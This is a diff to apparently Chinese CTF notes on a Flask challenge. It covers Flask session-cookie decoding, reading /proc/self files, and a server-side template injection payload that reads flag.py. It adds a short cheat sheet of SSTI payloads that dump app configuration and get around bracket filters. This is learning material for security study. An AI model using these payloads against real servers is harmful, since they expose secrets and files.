@@ -81,4 +81,11 @@ python .\flask_session_cookie_hack.py decode -c eyJuMWNvZGUiOm51bGx9.X92dcQ.uupV
     - `/proc/self/environ` 当前进程环境变量
     - `/proc/self/cmdline` 当前进程命令行，得到`python server.py`命令
     - `/proc/self/cwd` 当前进程工作目录，得到server.py源码，进而找出flask的cookie篡改漏洞。
-- 考察python读取文件的特殊命令`{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'flag.py\').read()}}'}`
+- 考察SSTI(模板注入)`{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'flag.py\').read()}}'}`
+
+## SSTI常用命令
+- {{config.items()}} *获取配置*
+- {{self.__dict__}} *自身dict*
+- {{get_flashed_messages.__globals__['current_app'].config}} *获取当前app配置*
+- {{get_flashed_messages.__globals__.__getitem__('current_app').config}} *__getitem__绕过[]*
+- {{url_for.__globals__.__getitem__('current_app').config}} *url_for减少字符长度*
